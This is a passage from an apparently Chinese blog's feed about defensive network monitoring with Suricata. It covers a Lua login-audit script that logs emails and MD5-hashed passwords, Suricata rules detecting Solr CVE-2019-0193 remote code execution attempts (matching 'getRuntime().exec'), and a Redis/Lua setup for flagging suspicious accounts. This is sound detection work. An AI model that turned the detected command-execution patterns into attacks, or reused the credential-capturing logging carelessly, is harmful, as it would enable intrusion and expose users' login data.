class="string">&quot;url&quot;</span>] = login_url</span><br><span class="line"></span><br><span class="line">    <span class="comment">-- http_url_path</span></span><br><span class="line">    http_table[<span class="string">&quot;url_path&quot;</span>] = http_url</span><br><span class="line"></span><br><span class="line">    <span class="comment">-- http_method</span></span><br><span class="line">    rl = HttpGetRequestLine()</span><br><span class="line">    http_method = <span class="built_in">string</span>.<span class="built_in">match</span>(rl, <span class="string">&quot;%w+&quot;</span>)</span><br><span class="line">    http_table[<span class="string">&quot;method&quot;</span>] = http_method</span><br><span class="line"></span><br><span class="line">    <span class="comment">-- http_status</span></span><br><span class="line">    rsl = HttpGetResponseLine()</span><br><span class="line">    status_code = <span class="built_in">string</span>.<span class="built_in">match</span>(rsl, <span class="string">&quot;%s(%d+)%s&quot;</span>)</span><br><span class="line">    http_status = <span class="built_in">tonumber</span>(status_code)</span><br><span class="line">    http_table[<span class="string">&quot;status&quot;</span>] = http_status</span><br><span class="line"></span><br><span class="line">    <span class="comment">-- http_protocol</span></span><br><span class="line">    http_protocol = <span class="built_in">string</span>.<span class="built_in">match</span>(rsl, <span class="string">&quot;(.-)%s&quot;</span>)</span><br><span class="line">    http_table[<span class="string">&quot;protocol&quot;</span>] = http_protocol</span><br><span class="line"></span><br><span class="line">    <span class="comment">-- request_token</span></span><br><span class="line">    cookie = HttpGetRequestHeader(<span class="string">&quot;Cookie&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> cookie ~= <span class="literal">nil</span> <span class="keyword">then</span></span><br><span class="line">        session_id = <span class="built_in">string</span>.<span class="built_in">match</span>(cookie, <span class="string">&quot;sessionID=(.-);&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> session_id ~= <span class="literal">nil</span> <span class="keyword">then</span></span><br><span class="line">            http_table[<span class="string">&quot;request_token&quot;</span>] = md5Encode(session_id)</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            http_table[<span class="string">&quot;request_token&quot;</span>]  = <span class="literal">nil</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">-- response_token &amp;&amp; member_id</span></span><br><span class="line">    set_cookie = HttpGetResponseHeader(<span class="string">&quot;Set-Cookie&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> set_cookie ~= <span class="literal">nil</span> <span class="keyword">then</span></span><br><span class="line">        session_id = <span class="built_in">string</span>.<span class="built_in">match</span>(set_cookie, <span class="string">&quot;sessionID=(.-);&quot;</span>)</span><br><span class="line">        http_table[<span class="string">&quot;response_token&quot;</span>]  = md5Encode(session_id)</span><br><span class="line">        member_id = <span class="built_in">string</span>.<span class="built_in">match</span>(set_cookie, <span class="string">&quot;memberId=(.-);&quot;</span>)</span><br><span class="line">        http_table[<span class="string">&quot;member_id&quot;</span>] = <span class="built_in">tonumber</span>(member_id)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">-- login_results</span></span><br><span class="line">    a, o, e = HttpGetResponseBody()</span><br><span class="line">    <span class="keyword">for</span> n, v <span class="keyword">in</span> <span class="built_in">ipairs</span>(a) <span class="keyword">do</span></span><br><span class="line">        body = json.decode(v)</span><br><span class="line">        results_code = <span class="built_in">tonumber</span>(body[<span class="string">&quot;code&quot;</span>])</span><br><span class="line">        <span class="keyword">if</span> results_code == success_code <span class="keyword">then</span></span><br><span class="line">            results = <span class="string">&quot;success&quot;</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            results = <span class="string">&quot;failed&quot;</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    http_table[<span class="string">&quot;results&quot;</span>] = results</span><br><span class="line">    http_table[<span class="string">&quot;results_code&quot;</span>] = results_code</span><br><span class="line"></span><br><span class="line">    <span class="comment">-- email &amp; password</span></span><br><span class="line">    a, o, e = HttpGetRequestBody()</span><br><span class="line">    <span class="keyword">for</span> n, v <span class="keyword">in</span> <span class="built_in">ipairs</span>(a) <span class="keyword">do</span></span><br><span class="line">        res = formatStr(v)</span><br><span class="line">        mail = urlDecode(res[<span class="string">&#x27;email&#x27;</span>])</span><br><span class="line">        pass = md5Encode(res[<span class="string">&#x27;password&#x27;</span>])</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    http_table[<span class="string">&quot;email&quot;</span>] = mail</span><br><span class="line">    http_table[<span class="string">&quot;password&quot;</span>] = pass</span><br><span class="line"></span><br><span class="line">    <span class="comment">-- RequestHeaders</span></span><br><span class="line">    rh = HttpGetRequestHeaders()</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> <span class="built_in">pairs</span>(rh) <span class="keyword">do</span></span><br><span class="line">        key = <span class="built_in">string</span>.<span class="built_in">lower</span>(k)</span><br><span class="line"></span><br><span class="line">        common_var = common_mapping_table[key]</span><br><span class="line">        <span class="keyword">if</span> common_var ~= <span class="literal">nil</span> <span class="keyword">then</span></span><br><span class="line">            http_table[common_var] = v</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">        request_var = request_mapping_table[key]</span><br><span class="line">        <span class="keyword">if</span> request_var ~= <span class="literal">nil</span> <span class="keyword">then</span></span><br><span class="line">            http_table[request_var] = v</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">-- ResponseHeaders</span></span><br><span class="line">    rsh = HttpGetResponseHeaders()</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> <span class="built_in">pairs</span>(rsh) <span class="keyword">do</span></span><br><span class="line">        key = <span class="built_in">string</span>.<span class="built_in">lower</span>(k)</span><br><span class="line"></span><br><span class="line">        common_var = common_mapping_table[key]</span><br><span class="line">        <span class="keyword">if</span> common_var ~= <span class="literal">nil</span> <span class="keyword">then</span></span><br><span class="line">            http_table[common_var] = v</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">        response_var = response_mapping_table[key]</span><br><span class="line">        <span class="keyword">if</span> response_var ~= <span class="literal">nil</span> <span class="keyword">then</span></span><br><span class="line">            http_table[response_var] = v</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">-- timestring = SCPacketTimeString() 2019-09-10T06:08:35.582449+0000</span></span><br><span class="line">    sec, usec = SCPacketTimestamp()</span><br><span class="line">    timestring = <span class="built_in">os</span>.<span class="built_in">date</span>(<span class="string">&quot;!%Y-%m-%dT%T&quot;</span>, sec) .. <span class="string">&quot;.&quot;</span> .. usec .. <span class="string">&quot;+0000&quot;</span></span><br><span class="line">    </span><br><span class="line">    ip_version, src_ip, dst_ip, protocol, src_port, dst_port = SCFlowTuple()</span><br><span class="line"></span><br><span class="line">    <span class="comment">-- flow_id</span></span><br><span class="line">    id = SCFlowId()</span><br><span class="line">    flow_id = <span class="built_in">string</span>.<span class="built_in">format</span>(<span class="string">&quot;%.0f&quot;</span>, id)</span><br><span class="line"></span><br><span class="line">    <span class="comment">-- true_ip</span></span><br><span class="line">    true_client_ip = HttpGetRequestHeader(<span class="string">&quot;True-Client-IP&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> true_client_ip ~= <span class="literal">nil</span> <span class="keyword">then</span></span><br><span class="line">        src_ip = true_client_ip</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">-- table</span></span><br><span class="line">    raw_data = &#123;</span><br><span class="line">        timestamp = timestring,</span><br><span class="line">        flow_id = flow_id,</span><br><span class="line">        src_ip = src_ip,</span><br><span class="line">        src_port = src_port,</span><br><span class="line">        dest_ip = dst_ip,</span><br><span class="line">        dest_port = dst_port,</span><br><span class="line">        event_name = event_name,</span><br><span class="line">        event_type = event_type,</span><br><span class="line">        app_type = app_type,</span><br><span class="line">        http = http_table,</span><br><span class="line">        proto = <span class="string">&quot;TCP&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">-- json encode</span></span><br><span class="line">    data = json.encode(raw_data)</span><br><span class="line"></span><br><span class="line">    file:<span class="built_in">write</span>(data .. <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    file:<span class="built_in">flush</span>()</span><br><span class="line"></span><br><span class="line">    http = http + <span class="number">1</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deinit</span> <span class="params">(args)</span></span></span><br><span class="line">    SCLogInfo (<span class="string">&quot;HTTP transactions logged: &quot;</span> .. http);</span><br><span class="line">    file:<span class="built_in">close</span>(file)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<hr>
<h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;src_port&quot;</span>: <span class="number">34963</span>,</span><br><span class="line">    <span class="attr">&quot;event_type&quot;</span>: <span class="string">&quot;lua&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;proto&quot;</span>: <span class="string">&quot;TCP&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;flow_id&quot;</span>: <span class="string">&quot;471693756052529&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;timestamp&quot;</span>: <span class="string">&quot;2019-10-07T13:51:01.560556+0000&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;event_name&quot;</span>: <span class="string">&quot;login_audit&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;dest_port&quot;</span>: <span class="number">3007</span>,</span><br><span class="line">    <span class="attr">&quot;http&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;response_content_length&quot;</span>: <span class="string">&quot;446&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;response_content_type&quot;</span>: <span class="string">&quot;application/json; charset=utf-8&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;accept_encoding&quot;</span>: <span class="string">&quot;gzip&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;server&quot;</span>: <span class="string">&quot;nginx&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;results_code&quot;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">&quot;vary&quot;</span>: <span class="string">&quot;Accept-Encoding&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;password&quot;</span>: <span class="string">&quot;420ce28ef813a2dc05e52a7e24eb0d5c&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;date&quot;</span>: <span class="string">&quot;Mon, 07 Oct 2019 13:51:01 GMT&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;request_content_type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;accept_language&quot;</span>: <span class="string">&quot;en-US,en;q=0.9&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;url&quot;</span>: <span class="string">&quot;/login&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;x_requested_with&quot;</span>: <span class="string">&quot;XMLHttpRequest&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;x_forwarded_proto&quot;</span>: <span class="string">&quot;https&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;user_agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;origin&quot;</span>: <span class="string">&quot;https://www.canon.com&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;response_token&quot;</span>: <span class="string">&quot;4f5f386aec34e877ce63fce7ddd3f15f&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;pragma&quot;</span>: <span class="string">&quot;no-cache&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;connection&quot;</span>: <span class="string">&quot;close&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;status&quot;</span>: <span class="number">200</span>,</span><br><span class="line">        <span class="attr">&quot;protocol&quot;</span>: <span class="string">&quot;HTTP/1.1&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;hostname&quot;</span>: <span class="string">&quot;www.canon.com&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;url_path&quot;</span>: <span class="string">&quot;/login&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;cache_control&quot;</span>: <span class="string">&quot;no-cache, max-age=0, no-store, must-revalidate&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;method&quot;</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;email&quot;</span>: <span class="string">&quot;admin@canon.com&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;request_token&quot;</span>: <span class="string">&quot;109464370570b23fa9768078ab1ac8a9&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;member_id&quot;</span>: <span class="number">123456</span>,</span><br><span class="line">        <span class="attr">&quot;results&quot;</span>: <span class="string">&quot;success&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;request_content_length&quot;</span>: <span class="string">&quot;49&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;src_ip&quot;</span>: <span class="string">&quot;77.99.22.17&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;dest_ip&quot;</span>: <span class="string">&quot;1.1.1.1&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;app_type&quot;</span>: <span class="string">&quot;web&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>NIDS</category>
      </categories>
      <tags>
        <tag>Suricata</tag>
      </tags>
  </entry>
  <entry>
    <title>Suricata Custom Rules</title>
    <url>/2019/10/31/Suricata%20-%20Rules/</url>
    <content><![CDATA[<h1 id="Solr-RCE-CVE-2019-0193"><a href="#Solr-RCE-CVE-2019-0193" class="headerlink" title="Solr RCE CVE-2019-0193"></a>Solr RCE CVE-2019-0193</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Solr POST RCE CVE-2019-0193</span></span><br><span class="line">alert http <span class="variable">$EXTERNAL_NET</span> any -&gt; <span class="variable">$HOME_NET</span> any (msg:<span class="string">&quot;LOCAL RULES EXPLOIT Solr RCE CVE-2019-0193 POST&quot;</span>; flow:to_server,established; flowbits:<span class="built_in">set</span>,CVE-2019-0193.post.request; content:<span class="string">&quot;POST&quot;</span>; http_method; fast_pattern; content:<span class="string">&quot;/solr&quot;</span>; http_uri; content:<span class="string">&quot;/config&quot;</span>; http_uri; content:<span class="string">&quot;params.resource.loader.enabled&quot;</span>; http_client_body; classtype:shellcode-detect; sid:3020016; rev:1; metadata:attack_target web_server, signature_severity Critical, direction outside_to_inside, created_at 2019_10_31, updated_at 2019_10_31, author Canon, tag RCE, tag CVE-2019-0193, tag http, tag exploit, tag Solr;)</span><br><span class="line"></span><br><span class="line">alert http <span class="variable">$EXTERNAL_NET</span> any -&gt; <span class="variable">$HOME_NET</span> any (msg:<span class="string">&quot;LOCAL RULES EXPLOIT Solr RCE CVE-2019-0193 POST Successful&quot;</span>; flow:from_server,established; flowbits:isset,CVE-2019-0193.post.request; content:<span class="string">&quot;200&quot;</span>; http_stat_code; classtype:shellcode-detect; sid:3020017; rev:1; metadata:attack_target web_server, signature_severity Critical, direction outside_to_inside, created_at 2019_10_31, updated_at 2019_10_31, author Canon, tag RCE, tag CVE-2019-0193, tag http, tag exploit, tag Solr;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Solr GET RCE CVE-2019-0193</span></span><br><span class="line">alert http <span class="variable">$EXTERNAL_NET</span> any -&gt; <span class="variable">$HOME_NET</span> any (msg:<span class="string">&quot;LOCAL RULES EXPLOIT Solr RCE CVE-2019-0193 GET&quot;</span>; flow:to_server,established; flowbits:<span class="built_in">set</span>,CVE-2019-0193.get.request; content:<span class="string">&quot;GET&quot;</span>; http_method; content:<span class="string">&quot;/solr&quot;</span>; http_uri; fast_pattern; content:<span class="string">&quot;/select?&quot;</span>; http_uri; content:<span class="string">&quot;wt=velocity&quot;</span>; http_uri; content:<span class="string">&quot;java.lang.Runtime&quot;</span>; http_uri; content:<span class="string">&quot;getRuntime().exec&quot;</span>; http_uri; classtype:shellcode-detect; sid:3020018; rev:1; metadata:attack_target web_server, signature_severity Critical, direction outside_to_inside, created_at 2019_10_31, updated_at 2019_10_31, author Canon, tag RCE, tag CVE-2019-0193, tag http, tag exploit, tag Solr;)</span><br><span class="line"></span><br><span class="line">alert http <span class="variable">$EXTERNAL_NET</span> any -&gt; <span class="variable">$HOME_NET</span> any (msg:<span class="string">&quot;LOCAL RULES EXPLOIT Solr RCE CVE-2019-0193 GET Successful&quot;</span>; flow:from_server,established; flowbits:isset,CVE-2019-0193.get.request; content:<span class="string">&quot;200&quot;</span>; http_stat_code; classtype:shellcode-detect; sid:3020019; rev:1; metadata:attack_target web_server, signature_severity Critical, direction outside_to_inside, created_at 2019_10_31, updated_at 2019_10_31, author Canon, tag RCE, tag CVE-2019-0193, tag http, tag exploit, tag Solr;)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>NIDS</category>
      </categories>
      <tags>
        <tag>Suricata</tag>
      </tags>
  </entry>
  <entry>
    <title>Suricata + Lua实现本地情报对接</title>
    <url>/2019/10/24/Suricata+Lua%E5%AE%9E%E7%8E%B0%E6%9C%AC%E5%9C%B0%E6%83%85%E6%8A%A5%E5%AF%B9%E6%8E%A5/</url>
    <content><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>​        由于近期网站遭受恶意攻击, 通过对于登录接口的审计与分析, 现已确定了一批可疑账号。既然之前写过一个登录接口的审计脚本, 那么完全可以通过扩展这个脚本来实现对于可疑账号的比对。主要思路: 通过将可疑账号存进Redis中, 再利用Lua脚本调用Redis接口进行账号的比对。</p>
<p>先说一下<strong>Suricata</strong>默认是存在黑名单机制的, 如下:</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># IP Reputation</span></span><br><span class="line"><span class="comment">#reputation-categories-file: /etc/suricata/iprep/categories.txt</span></span><br><span class="line"><span class="comment">#default-reputation-path: /etc/suricata/iprep</span></span><br><span class="line"><span class="comment">#reputation-files:</span></span><br><span class="line"><span class="comment"># - reputation.list</span></span><br></pre></td></tr></table></figure>

<p>在<strong>Suricata 5.0</strong> 版本中更是增加了新的功能**<a href="https://suricata.readthedocs.io/en/suricata-5.0.0/rules/datasets.html">Datasets</a>**。大概看了一下, 可以通过在规则中使用<code>dataset</code>和<code>datarep</code>关键字将大量数据与<code>sticky buffer</code>进行匹配。确实是个很赞的功能!</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">alert http any any -&gt; any any (http.user_agent; dataset:<span class="built_in">set</span>, ua-seen, <span class="built_in">type</span> string, save ua-seen.lst; sid:1;)</span><br><span class="line"></span><br><span class="line">alert dns any any -&gt; any any (dns.query; to_sha256; dataset:<span class="built_in">set</span>, dns-sha256-seen, <span class="built_in">type</span> sha256, save dns-sha256-seen.lst; sid:2;)</span><br><span class="line"></span><br><span class="line">alert http any any -&gt; any any (http.uri; to_md5; dataset:isset, http-uri-md5-seen, <span class="built_in">type</span> md5, load http-uri-md5-seen.lst; sid:3;)</span><br></pre></td></tr></table></figure>

<p><strong>但是</strong>… 这并不适用我现在的场景, 因为在我的场景中, 用户的登录请求存在于POST请求中, 默认的Suricata方法并不能准确定位到我们需要的账号。这个时候我们就只能依赖于<strong>Lua</strong>脚本来扩展。当然这些需求<strong>Zeek</strong>也可以满足, 只是…<strong>Zeek</strong>的脚本真是难写…不忍吐槽~</p>
<h1 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h1><h2 id="运行环境"><a href="#运行环境" class="headerlink" title="运行环境"></a>运行环境</h2><p>​    <strong>OS</strong>: <em>Ubuntu 18.04</em></p>
<p>​    <strong>Suricata</strong>: <em>Suricata 5.0.0 RELEASE</em></p>
<h2 id="LuaRocks"><a href="#LuaRocks" class="headerlink" title="LuaRocks"></a>LuaRocks</h2><ol>
<li>由于Ubuntu默认没有安装**<a href="https://luarocks.org/">LuaRocks</a>** (<em>LuaRocks is the package manager for Lua modules</em>), 这里需要我们手动安装。</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 通过apt直接安装, 简单省事儿。</span></span><br><span class="line">$ apt-get install luarocks</span><br></pre></td></tr></table></figure>

<hr>
<ol start="2">
<li>通过<code>luarocks</code>安装我们所需要的<code>lua</code>模块, 这里我们需要用到<code>redis-lua</code>、<code>luasocket</code>这两个模块。</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Install Modules</span></span><br><span class="line">$ luarocks install luasocket</span><br><span class="line">$ luarocks install redis-lua</span><br><span class="line"></span><br><span class="line">$ ll /usr/<span class="built_in">local</span>/share/lua/5.1/</span><br><span class="line">total 72</span><br><span class="line">drwxr-xr-x 3 root root  4096 Oct 25 03:35 ./</span><br><span class="line">drwxr-xr-x 3 root root  4096 Sep 17 14:14 ../</span><br><span class="line">-rw-r--r-- 1 root root  8331 Oct 25 03:34 ltn12.lua</span><br><span class="line">-rw-r--r-- 1 root root  2487 Oct 25 03:34 mime.lua</span><br><span class="line">-rw-r--r-- 1 root root 35599 Oct 25 03:35 redis.lua</span><br><span class="line">drwxr-xr-x 2 root root  4096 Oct 25 03:34 socket/</span><br><span class="line">-rw-r--r-- 1 root root  4451 Oct 25 03:34 socket.lua</span><br></pre></td></tr></table></figure>

<hr>
<ol start="3">
<li>安装成功后,  可以简单的测试一下。</li>
</ol>
<ul>
<li>利用<strong>Docker</strong>启动<strong>Redis</strong>容器</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ docker run -ti -d -p 6379:6379 redis</span><br></pre></td></tr></table></figure>

<ul>
<li>测试脚本<code>hello_redis.lua</code></li>
</ul>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">local</span> redis = <span class="built_in">require</span> <span class="string">&quot;redis&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> client = redis.connect(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">6379</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> response = client:ping()</span><br><span class="line"><span class="keyword">if</span> response == <span class="literal">false</span> <span class="keyword">then</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">client:set(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> var = client:get(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(var)</span><br></pre></td></tr></table></figure>

<ul>
<li>可能会存在环境变量不对导致的报错</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ luajit hello_redis.lua</span><br><span class="line">	luajit: /usr/<span class="built_in">local</span>/share/lua/5.1/redis.lua:793: module <span class="string">&#x27;socket&#x27;</span> not found:</span><br><span class="line">	no field package.preload[<span class="string">&#x27;socket&#x27;</span>]</span><br><span class="line">	no file <span class="string">&#x27;./socket.lua&#x27;</span></span><br><span class="line">	no file <span class="string">&#x27;/usr/local/share/luajit-2.0.5/socket.lua&#x27;</span></span><br><span class="line">	no file <span class="string">&#x27;/usr/local/share/lua/5.1/socket.lua&#x27;</span></span><br><span class="line">	no file <span class="string">&#x27;/usr/local/share/lua/5.1/socket/init.lua&#x27;</span></span><br><span class="line">	no file <span class="string">&#x27;./socket.so&#x27;</span></span><br><span class="line">	no file <span class="string">&#x27;/usr/local/lib/lua/5.1/socket.so&#x27;</span></span><br><span class="line">	no file <span class="string">&#x27;/usr/local/lib/lua/5.1/loadall.so&#x27;</span></span><br><span class="line">stack traceback:</span><br><span class="line">	[C]: <span class="keyword">in</span> <span class="keyword">function</span> <span class="string">&#x27;require&#x27;</span></span><br><span class="line">	/usr/<span class="built_in">local</span>/share/lua/5.1/redis.lua:793: <span class="keyword">in</span> <span class="keyword">function</span> <span class="string">&#x27;create_connection&#x27;</span></span><br><span class="line">	/usr/<span class="built_in">local</span>/share/lua/5.1/redis.lua:836: <span class="keyword">in</span> <span class="keyword">function</span> <span class="string">&#x27;connect&#x27;</span></span><br><span class="line">	a.lua:3: <span class="keyword">in</span> main chunk</span><br><span class="line">	[C]: at 0x56508049e440</span><br></pre></td></tr></table></figure>

<ul>
<li>执行<code>luarocks path --bin</code> 并将结果输入</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ luarocks path --bin</span><br><span class="line">Warning: The directory <span class="string">&#x27;/home/canon/.cache/luarocks&#x27;</span> or its parent directory is not owned by the current user and the cache has been disabled. Please check the permissions and owner of that directory. If executing /usr/<span class="built_in">local</span>/bin/luarocks with sudo, you may want sudo<span class="string">&#x27;s -H flag.</span></span><br><span class="line"><span class="string">export LUA_PATH=&#x27;</span>/home/canon/.luarocks/share/lua/5.1/?.lua;/home/canon/.luarocks/share/lua/5.1/?/init.lua;/usr/<span class="built_in">local</span>/share/lua/5.1/?.lua;/usr/<span class="built_in">local</span>/share/lua/5.1/?/init.lua;./?.lua;/usr/<span class="built_in">local</span>/share/luajit-2.0.5/?.lua<span class="string">&#x27;</span></span><br><span class="line"><span class="string">export LUA_CPATH=&#x27;</span>/home/canon/.luarocks/lib/lua/5.1/?.so;/usr/<span class="built_in">local</span>/lib/lua/5.1/?.so;./?.so;/usr/<span class="built_in">local</span>/lib/lua/5.1/loadall.so<span class="string">&#x27;</span></span><br><span class="line"><span class="string">export PATH=&#x27;</span>/home/canon/.luarocks/bin:/usr/<span class="built_in">local</span>/bin:/home/canon/anaconda3/bin:/home/canon/anaconda3/condabin:/usr/<span class="built_in">local</span>/sbin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>执行脚本, 将会看到如下输出:</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ luajit hello_redis.lua</span><br><span class="line">world</span><br></pre></td></tr></table></figure>



<h3 id="CJson"><a href="#CJson" class="headerlink" title="CJson"></a>CJson</h3><p>​        这里<strong>强烈建议</strong>大家使用CJson模块, 我之前为了测试随便从github上找了个json模块来使用。这几天发现在网站的高峰时期 Suricata <strong>app_layer.flow</strong> 这个字段非常的大, 从而导致了 <strong>kernel_drops</strong>。由于我们的网站是面对海外用户有时差, 经过几天的熬夜最终定位到是由于json模块太过于消耗性能而导致。可以看下这个截图:</p>
<ul>
<li>启用CJson模块之前的监控图</li>
</ul>
<p><img src="/2019/10/24/Suricata+Lua%E5%AE%9E%E7%8E%B0%E6%9C%AC%E5%9C%B0%E6%83%85%E6%8A%A5%E5%AF%B9%E6%8E%A5/image-20191104103020962.png" alt="image-20191104103020962"></p>
<ul>
<li>启用CJson模块之后的监控图</li>
</ul>
<p><img src="/2019/10/24/Suricata+Lua%E5%AE%9E%E7%8E%B0%E6%9C%AC%E5%9C%B0%E6%83%85%E6%8A%A5%E5%AF%B9%E6%8E%A5/image-20191104103557884.png" alt="image-20191104103557884"></p>
<ol>
<li>下载CJson模块</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># wget 下载</span></span><br><span class="line">$ wget https://www.kyne.com.au/~mark/software/download/lua-cjson-2.1.0.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment"># Git</span></span><br><span class="line">$ git <span class="built_in">clone</span> git@github.com:mpx/lua-cjson.git</span><br></pre></td></tr></table></figure>

<hr>
<ol start="2">
<li> 根据Lua环境修改Makefile(个人配置)</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">##### Build defaults #####</span></span><br><span class="line">LUA_VERSION =       5.1</span><br><span class="line">TARGET =            cjson.so</span><br><span class="line">PREFIX =            /usr/<span class="built_in">local</span></span><br><span class="line"><span class="comment">#CFLAGS =            -g -Wall -pedantic -fno-inline</span></span><br><span class="line">CFLAGS =            -O3 -Wall -pedantic -DNDEBUG</span><br><span class="line">CJSON_CFLAGS =      -fpic</span><br><span class="line">CJSON_LDFLAGS =     -shared</span><br><span class="line">LUA_INCLUDE_DIR =   $(PREFIX)/include/luajit-2.0</span><br><span class="line">LUA_CMODULE_DIR =   $(PREFIX)/lib/lua/$(LUA_VERSION)</span><br><span class="line">LUA_MODULE_DIR =    $(PREFIX)/share/lua/$(LUA_VERSION)</span><br><span class="line">LUA_BIN_DIR =       $(PREFIX)/bin</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>安装</li>
</ol>
